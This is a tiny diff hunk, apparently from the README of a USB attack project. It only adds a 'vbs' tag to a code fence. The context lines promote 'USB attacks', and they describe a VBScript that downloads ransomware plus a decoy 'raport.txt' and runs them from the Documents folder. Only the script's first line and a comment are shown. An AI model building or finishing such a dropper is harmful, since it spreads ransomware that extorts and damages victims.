@@ -282,7 +282,7 @@ Just modify the .vbs file with the payload you want and enjoy your USB attacks! 
 
 
 Script that downloads the ransomware + raport.txt and executes it in the Documents folder.
-```
+```vbs
 Set objShell = CreateObject("Wscript.Shell")
 
 ' Download fake raport
